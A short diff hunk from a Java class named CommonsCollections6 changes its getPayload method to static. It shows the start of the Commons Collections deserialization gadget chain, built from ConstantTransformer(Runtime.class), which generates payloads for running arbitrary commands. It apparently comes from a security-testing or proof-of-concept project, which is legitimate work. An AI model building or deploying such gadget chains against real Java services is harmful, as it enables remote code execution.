@@ -15,7 +15,7 @@ import java.util.Map;
 
 
 public class CommonsCollections6 {
-    public byte[] getPayload(String command) throws Exception {
+    public static byte[] getPayload(String command) throws Exception {
         Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
         Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
